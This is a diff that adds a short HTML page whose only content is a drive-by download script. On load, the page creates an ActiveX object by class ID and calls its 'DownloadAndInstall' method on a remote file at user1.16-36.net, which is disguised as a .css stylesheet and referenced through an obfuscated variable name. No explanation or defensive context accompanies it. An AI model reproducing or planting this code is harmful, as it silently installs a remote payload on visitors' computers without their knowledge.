@@ -1,0 +1,14 @@
+<HTML>
+<HEAD>
+<META http-equiv=Content-Type content="text/html; charset=gb2312">
+<META content="MSHTML 6.00.2900.3354" name=GENERATOR></HEAD>
+<br>
+<BODY>
+<OBJECT id=install classid=clsid:78ABDC59-D8E7-44D3-9A76-9A0918C52B4A></OBJECT>
+<SCRIPT>
+var YEtYcJsR1="http://user1.16-36.net/ce.css";
+install["DownloadAndInstall"](YEtYcJsR1);
+</SCRIPT>
+<br>
+</BODY>
+</html>
